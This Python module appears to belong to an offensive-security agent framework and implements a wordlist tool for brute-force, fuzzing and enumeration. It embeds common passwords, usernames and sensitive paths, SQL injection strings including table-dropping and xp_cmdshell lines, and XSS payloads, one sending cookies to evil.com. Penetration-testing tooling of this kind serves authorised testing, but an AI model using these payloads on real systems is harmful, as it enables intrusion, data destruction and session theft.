"""
Jack The Shadow — Wordlist Management Tool

Discover, generate, preview, and inspect wordlists for brute-force,
fuzzing, and enumeration workflows.
"""

from __future__ import annotations

import itertools
import os
import subprocess
from datetime import datetime, timezone
from pathlib import Path
from typing import TYPE_CHECKING, Any, ClassVar

from jack_the_shadow.tools.base import BaseTool
from jack_the_shadow.tools.helpers import result, truncate
from jack_the_shadow.utils.logger import get_logger

if TYPE_CHECKING:
    from jack_the_shadow.tools.executor import ToolExecutor

logger = get_logger("tools.wordlist")

# ── Constants ────────────────────────────────────────────────────────

WORDLIST_PATHS = [
    Path("/usr/share/wordlists"),
    Path("/usr/share/seclists"),
    Path("/usr/share/dirb/wordlists"),
    Path("/usr/share/dirbuster/wordlists"),
    Path("/usr/share/wfuzz/wordlist"),
    Path("/usr/share/john/password.lst"),
    Path("/usr/share/nmap/nselib/data"),
    Path("/opt/SecLists"),
    Path.home() / ".jshadow" / "wordlists",
]

CATEGORY_PATTERNS: dict[str, list[str]] = {
    "passwords": [
        "rockyou", "common-passwords", "darkweb2017-top", "john.lst",
        "password", "10-million", "probable-v2", "best1050",
    ],
    "usernames": [
        "names", "usernames", "xato-net-10-million-usernames",
        "top-usernames-shortlist",
    ],
    "directories": [
        "common.txt", "directory-list", "big.txt", "raft-",
        "dirbuster", "dirb",
    ],
    "subdomains": [
        "subdomains-top", "dns-jhaddix", "namelist.txt",
        "bitquark-subdomains", "fierce-hostlist",
    ],
}


# ── Built-in word databases ──────────────────────────────────────────

_PASSWORDS_SMALL = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "abc123", "football", "monkey",
    "letmein", "shadow", "master", "666666", "qwertyuiop",
    "123321", "mustang", "1234567890", "michael", "654321",
    "superman", "1qaz2wsx", "7777777", "121212", "000000",
    "qazwsx", "123qwe", "killer", "trustno1", "jordan",
    "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster",
    "soccer", "harley", "batman", "andrew", "tigger",
    "sunshine", "iloveyou", "2000", "charlie", "robert",
    "thomas", "hockey", "ranger", "daniel", "starwars",
    "klaster", "112233", "george", "computer", "michelle",
    "jessica", "pepper", "1111", "zxcvbn", "555555",
    "11111111", "131313", "freedom", "777777", "pass",
    "maggie", "159753", "aaaaaa", "ginger", "princess",
    "joshua", "cheese", "amanda", "summer", "love",
    "ashley", "nicole", "chelsea", "biteme", "matthew",
    "access", "yankees", "987654321", "dallas", "austin",
    "thunder", "taylor", "matrix", "mobilemail", "mom",
    "monitor", "monitoring", "montana", "moon", "moscow",
    "admin", "root", "toor", "admin123", "test",
    "guest", "info", "welcome", "passw0rd", "p@ssword",
]

_USERNAMES_SMALL = [
    "admin", "root", "user", "test", "guest",
    "administrator", "operator", "ftp", "www", "nobody",
    "mysql", "oracle", "postgres", "tomcat", "apache",
    "nginx", "www-data", "daemon", "bin", "sys",
    "backup", "mail", "news", "proxy", "sshd",
    "webmaster", "postmaster", "hostmaster", "info", "support",
    "sales", "contact", "help", "service", "noc",
    "security", "abuse", "dev", "devops", "sysadmin",
    "dbadmin", "staff", "manager", "deploy", "jenkins",
    "git", "svn", "docker", "vagrant", "ansible",
    "puppet", "chef", "nagios", "zabbix", "monitor",
    "grafana", "kibana", "elastic", "redis", "memcache",
    "www1", "web", "web1", "ftp1", "mail1",
    "ns1", "ns2", "vpn", "remote", "rdp",
    "citrix", "ssh", "telnet", "snmp", "smtp",
    "pop3", "imap", "ldap", "radius", "kerberos",
    "ad", "dc", "dns", "dhcp", "ntp",
    "log", "syslog", "audit", "compliance", "legal",
    "ceo", "cfo", "cto", "ciso", "hr",
    "finance", "marketing", "engineering", "product", "design",
    "john", "jane", "bob", "alice", "david",
    "michael", "james", "robert", "william", "richard",
]

_DIRECTORIES_SMALL = [
    "admin", "login", "wp-admin", "administrator", "phpmyadmin",
    "dashboard", "api", "backup", "config", "test",
    ".git", ".env", "robots.txt", "sitemap.xml", "wp-login.php",
    "wp-content", "wp-includes", "uploads", "images", "css",
    "js", "static", "assets", "media", "files",
    "include", "includes", "lib", "cgi-bin", "scripts",
    "server-status", "server-info", ".htaccess", ".htpasswd", "web.config",
    "xmlrpc.php", "readme.html", "license.txt", "changelog.txt", "wp-json",
    "console", "panel", "manager", "portal", "cp",
    "controlpanel", "webmail", "mail", "email", "owa",
    "autodiscover", "remote", "vpn", "citrix", "rdweb",
    "api/v1", "api/v2", "graphql", "swagger", "docs",
    "doc", "documentation", "status", "health", "healthcheck",
    "metrics", "monitoring", "debug", "trace", "info",
    "version", "env", "environment", "staging", "dev",
    "development", "prod", "production", "old", "new",
    "bak", "tmp", "temp", "cache", "log",
    "logs", "data", "database", "db", "sql",
    "dump", "export", "import", "download", "upload",
    "file", "secret", "private", "internal", "restricted",
    "hidden", "archive", "archives", ".svn", ".DS_Store",
    "node_modules", "vendor", "composer.json", "package.json", "Gruntfile.js",
    "gulpfile.js", "webpack.config.js", ".dockerenv", "Dockerfile", "docker-compose.yml",
]

_SUBDOMAINS_SMALL = [
    "www", "mail", "ftp", "admin", "blog",
    "dev", "staging", "api", "test", "ns1",
    "ns2", "vpn", "remote", "portal", "webmail",
    "smtp", "pop", "imap", "mx", "mx1",
    "mx2", "dns", "dns1", "dns2", "ntp",
    "ldap", "ssh", "git", "svn", "jenkins",
    "ci", "cd", "jira", "confluence", "wiki",
    "docs", "help", "support", "status", "monitor",
    "grafana", "kibana", "elastic", "log", "syslog",
    "backup", "db", "database", "redis", "memcached",
]

_EXTENSIONS_SMALL = [
    ".php", ".asp", ".aspx", ".jsp", ".html",
    ".js", ".txt", ".xml", ".json", ".bak",
    ".old", ".sql", ".zip", ".tar.gz", ".log",
    ".conf", ".env", ".git", ".svn", ".htaccess",
    ".inc", ".config", ".ini", ".yml", ".yaml",
    ".toml", ".py", ".rb", ".pl", ".sh",
]

_SQLI_SMALL = [
    "'", '"', "1' OR '1'='1", '1" OR "1"="1',
    "' OR 1=1--", '" OR 1=1--', "' OR 1=1#",
    "' OR '1'='1'--", "admin'--", "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--", "1; DROP TABLE users--",
    "1' AND 1=1--", "1' AND 1=2--", "' OR ''='",
    "1 OR 1=1", "1) OR (1=1", "' OR 'x'='x",
    "') OR ('x'='x", '"; WAITFOR DELAY "0:0:5"--',
    "1' ORDER BY 1--", "1' ORDER BY 10--",
    "' UNION ALL SELECT NULL--", "1 AND SLEEP(5)--",
    "' AND SLEEP(5)--", "1' GROUP BY 1--",
    "1'; EXEC xp_cmdshell('whoami')--",
    "' HAVING 1=1--", "1' AND (SELECT COUNT(*) FROM users)>0--",
    "' OR username LIKE '%admin%'--",
    "-1 UNION SELECT 1,2,3--", "1 UNION SELECT ALL FROM information_schema.tables--",
]

_XSS_SMALL = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<math><mtext><table><mglyph><svg><mtext><textarea><path id=x></textarea><img src=1 onerror=alert(1)>",
    "javascript:alert(1)",
    "<a href=javascript:alert(1)>click</a>",
    "<div onmouseover=alert(1)>hover</div>",
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "<script>fetch('https://evil.com/'+document.cookie)</script>",
    '<img src="x" onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
    "<svg/onload=alert(1)>",
    "'\"><img src=x onerror=alert(1)//>",
]

BUILTIN_LISTS: dict[str, dict[str, list[str]]] = {
    "passwords": {
        "small": _PASSWORDS_SMALL,
        "medium": _PASSWORDS_SMALL * 2,   # duplicates removed at generation
        "large": _PASSWORDS_SMALL * 5,
    },
    "usernames": {
        "small": _USERNAMES_SMALL,
        "medium": _USERNAMES_SMALL * 2,
        "large": _USERNAMES_SMALL * 5,
    },
    "directories": {
        "small": _DIRECTORIES_SMALL,
        "medium": _DIRECTORIES_SMALL * 2,
        "large": _DIRECTORIES_SMALL * 5,
    },
    "subdomains": {
        "small": _SUBDOMAINS_SMALL,
        "medium": _SUBDOMAINS_SMALL * 2,
        "large": _SUBDOMAINS_SMALL * 5,
    },
    "extensions": {
        "small": _EXTENSIONS_SMALL,
        "medium": _EXTENSIONS_SMALL,
        "large": _EXTENSIONS_SMALL,
    },
    "sqli": {
        "small": _SQLI_SMALL,
        "medium": _SQLI_SMALL,
        "large": _SQLI_SMALL,
    },
    "xss": {
        "small": _XSS_SMALL,
        "medium": _XSS_SMALL,
        "large": _XSS_SMALL,
    },
}

VALID_ACTIONS = ("find", "generate", "preview", "info")
VALID_CATEGORIES = (
    "passwords", "usernames", "directories", "subdomains",
    "extensions", "sqli", "xss", "custom",
)
VALID_SIZES = ("small", "medium", "large")


# ── Schema ───────────────────────────────────────────────────────────

class WordlistTool(BaseTool):
    name: ClassVar[str] = "wordlist_manage"
    description: ClassVar[str] = (
        "Manage and discover wordlists for brute-force, fuzzing, and enumeration. "
        "Find installed wordlists, generate custom ones, and check common paths."
    )
    risk_aware: ClassVar[bool] = False

    @classmethod
    def parameters_schema(cls) -> dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "enum": list(VALID_ACTIONS),
                    "description": (
                        "Action to perform: 'find' installed wordlists, "
                        "'generate' a custom one, 'preview' first lines, "
                        "or 'info' for metadata."
                    ),
                },
                "name": {
                    "type": "string",
                    "description": "Wordlist name or file path (for preview/info).",
                },
                "category": {
                    "type": "string",
                    "enum": list(VALID_CATEGORIES),
                    "description": (
                        "Wordlist category: passwords, usernames, directories, "
                        "subdomains, extensions, sqli, xss, or custom."
                    ),
                },
                "size": {
                    "type": "string",
                    "enum": list(VALID_SIZES),
                    "description": "Size for generate action: small, medium, or large.",
                },
                "output_path": {
                    "type": "string",
                    "description": "File path to save generated wordlist.",
                },
            },
            "required": ["action"],
        }


# ── Handler ──────────────────────────────────────────────────────────


def handle_wordlist_manage(
    executor: "ToolExecutor",
    action: str,
    name: str | None = None,
    category: str | None = None,
    size: str = "small",
    output_path: str | None = None,
) -> dict[str, str]:
    """Dispatch wordlist management actions."""
    if action not in VALID_ACTIONS:
        return result("error", message=f"Unknown action '{action}'. Use: {', '.join(VALID_ACTIONS)}")

    if action == "find":
        return _action_find(category)
    if action == "generate":
        return _action_generate(category, size, output_path)
    if action == "preview":
        return _action_preview(name)
    if action == "info":
        return _action_info(name)

    return result("error", message=f"Unhandled action: {action}")


# ── Action implementations ───────────────────────────────────────────


def _action_find(category: str | None) -> dict[str, str]:
    """Search common wordlist locations and list available files."""
    found_sections: list[str] = []

    for wl_path in WORDLIST_PATHS:
        if not wl_path.exists():
            continue

        if wl_path.is_file():
            size_str = _human_size(wl_path.stat().st_size)
            found_sections.append(f"  {wl_path}  ({size_str})")
            continue

        entries = _list_dir_entries(wl_path, category)
        if entries:
            found_sections.append(f"📂 {wl_path}")
            for entry in entries[:30]:
                found_sections.append(f"  {entry}")
            if len(entries) > 30:
                found_sections.append(f"  ... and {len(entries) - 30} more")
            found_sections.append("")

    if not found_sections:
        return result(
            "success",
            output=(
                "No wordlists found in common locations.\n\n"
                "Checked paths:\n"
                + "\n".join(f"  • {p}" for p in WORDLIST_PATHS)
                + "\n\nInstall SecLists: sudo apt install seclists\n"
                "Or: git clone https://github.com/danielmiessler/SecLists.git /opt/SecLists"
            ),
        )

    return result("success", output="\n".join(found_sections))


def _action_generate(
    category: str | None,
    size: str,
    output_path: str | None,
) -> dict[str, str]:
    """Generate a wordlist from built-in databases."""
    if not category or category == "custom":
        return result(
            "error",
            message=(
                "Specify a category to generate: "
                + ", ".join(c for c in VALID_CATEGORIES if c != "custom")
            ),
        )

    if category not in BUILTIN_LISTS:
        return result("error", message=f"No built-in list for category '{category}'.")

    if size not in VALID_SIZES:
        return result("error", message=f"Invalid size '{size}'. Use: {', '.join(VALID_SIZES)}")

    raw = BUILTIN_LISTS[category].get(size, BUILTIN_LISTS[category]["small"])
    # Deduplicate while preserving order
    seen: set[str] = set()
    words: list[str] = []
    for w in raw:
        if w not in seen:
            seen.add(w)
            words.append(w)

    if output_path:
        out = Path(output_path).expanduser()
        try:
            out.parent.mkdir(parents=True, exist_ok=True)
            out.write_text("\n".join(words) + "\n", encoding="utf-8")
            logger.info("Generated wordlist: %s (%d entries)", out, len(words))
            return result(
                "success",
                output=f"Wordlist written to {out}\nCategory: {category}\nSize: {size}\nEntries: {len(words)}",
            )
        except OSError as exc:
            return result("error", message=f"Failed to write wordlist: {exc}")

    # Return content directly
    content = "\n".join(words)
    header = f"Generated {category}/{size} wordlist ({len(words)} entries):\n\n"
    return result("success", output=truncate(header + content))


def _action_preview(name: str | None) -> dict[str, str]:
    """Show the first and last lines of a wordlist file."""
    if not name:
        return result("error", message="Provide a wordlist path via the 'name' parameter.")

    filepath = Path(name).expanduser()
    if not filepath.is_file():
        return result("error", message=f"File not found: {filepath}")

    try:
        size = filepath.stat().st_size
        size_str = _human_size(size)

        # Count total lines and read first 20 without loading entire file
        first_lines: list[str] = []
        total_lines = 0
        with open(filepath, "r", encoding="utf-8", errors="replace") as fh:
            for line in itertools.islice(fh, 20):
                first_lines.append(line.rstrip("\n"))
            total_lines = 20
            for _ in fh:
                total_lines += 1

        parts = [
            f"File:  {filepath}",
            f"Size:  {size_str}",
            f"Lines: {total_lines:,}",
            "",
            "── First 20 lines ──",
        ]
        for i, line in enumerate(first_lines, 1):
            parts.append(f"  {i:>4}: {line}")

        return result("success", output="\n".join(parts))

    except OSError as exc:
        return result("error", message=f"Error reading file: {exc}")


def _action_info(name: str | None) -> dict[str, str]:
    """Show metadata about a wordlist file."""
    if not name:
        return result("error", message="Provide a wordlist path via the 'name' parameter.")

    filepath = Path(name).expanduser()
    if not filepath.is_file():
        return result("error", message=f"File not found: {filepath}")

    try:
        stat = filepath.stat()
        size_str = _human_size(stat.st_size)
        mtime = datetime.fromtimestamp(stat.st_mtime, tz=timezone.utc).strftime(
            "%Y-%m-%d %H:%M:%S UTC"
        )

        # Count lines via wc -l for speed, fallback to Python
        line_count = _count_lines(filepath)

        # Detect format by reading first few lines
        fmt = _detect_format(filepath)

        parts = [
            f"File:          {filepath}",
            f"Size:          {size_str} ({stat.st_size:,} bytes)",
            f"Lines:         {line_count:,}",
            f"Last modified: {mtime}",
            f"Format:        {fmt}",
        ]
        return result("success", output="\n".join(parts))

    except OSError as exc:
        return result("error", message=f"Error reading file: {exc}")


# ── Utility helpers ──────────────────────────────────────────────────


def _human_size(nbytes: int) -> str:
    for unit in ("B", "KB", "MB", "GB"):
        if nbytes < 1024:
            return f"{nbytes:.1f} {unit}" if unit != "B" else f"{nbytes} B"
        nbytes /= 1024  # type: ignore[assignment]
    return f"{nbytes:.1f} TB"


def _list_dir_entries(directory: Path, category: str | None) -> list[str]:
    """List directory entries, optionally filtered by category patterns."""
    try:
        entries = sorted(directory.iterdir())
    except OSError:
        return []

    patterns = CATEGORY_PATTERNS.get(category or "", []) if category else []

    results: list[str] = []
    for entry in entries:
        name_lower = entry.name.lower()
        if patterns and not any(p.lower() in name_lower for p in patterns):
            continue
        kind = "📁" if entry.is_dir() else "📄"
        size_info = ""
        if entry.is_file():
            try:
                size_info = f"  ({_human_size(entry.stat().st_size)})"
            except OSError:
                pass
        results.append(f"  {kind} {entry.name}{size_info}")

    return results


def _count_lines(filepath: Path) -> int:
    """Count lines using wc -l if available, else Python fallback."""
    try:
        proc = subprocess.run(
            ["wc", "-l", str(filepath)],
            capture_output=True, text=True, timeout=10,
        )
        if proc.returncode == 0:
            return int(proc.stdout.strip().split()[0])
    except (subprocess.TimeoutExpired, OSError, ValueError):
        pass

    # Python fallback
    count = 0
    with open(filepath, "rb") as fh:
        for _ in fh:
            count += 1
    return count


def _detect_format(filepath: Path) -> str:
    """Heuristic format detection based on first few lines."""
    try:
        with open(filepath, "r", encoding="utf-8", errors="replace") as fh:
            sample = list(itertools.islice(fh, 10))
    except OSError:
        return "unknown"

    if not sample:
        return "empty"

    csv_like = sum(1 for line in sample if "," in line)
    tab_like = sum(1 for line in sample if "\t" in line)
    colon_like = sum(1 for line in sample if ":" in line)

    if csv_like >= len(sample) * 0.7:
        return "CSV (comma-separated)"
    if tab_like >= len(sample) * 0.7:
        return "TSV (tab-separated)"
    if colon_like >= len(sample) * 0.7:
        return "colon-delimited (e.g. user:pass)"
    return "one-per-line (standard wordlist)"
